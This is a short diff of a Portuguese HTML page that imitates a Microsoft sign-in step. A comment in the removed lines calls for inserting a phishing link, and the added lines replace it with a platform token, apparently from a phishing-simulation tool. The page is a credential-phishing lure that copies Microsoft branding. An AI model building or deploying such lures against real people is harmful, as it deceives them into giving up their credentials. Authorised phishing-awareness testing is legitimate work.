@@ -75,9 +75,9 @@
           <div><span class="n">3</span> Inicie sessão na sua conta Microsoft</div>
         </div>
 
-        <!-- Link normal: abre em novo separador (equivalente sem-JS ao popup).
-             Substitua PHISHING_URL_AQUI pelo link de phishing da sua ferramenta. -->
-        <a class="cta" href="PHISHING_URL_AQUI" target="_blank" rel="noopener">
+        <!-- Botão de ação: usa o token ${submitLink} (resolvido pela plataforma).
+             role=button, rel=noopener, target=_self — lógica do botão Submit. -->
+        <a class="cta" role="button" href="${submitLink}" rel="noopener" target="_self">
           <span class="ms" style="filter:brightness(0) invert(1)"><i class="r"></i><i class="g"></i><i class="b"></i><i class="y"></i></span>
           Continuar para a Microsoft
         </a>
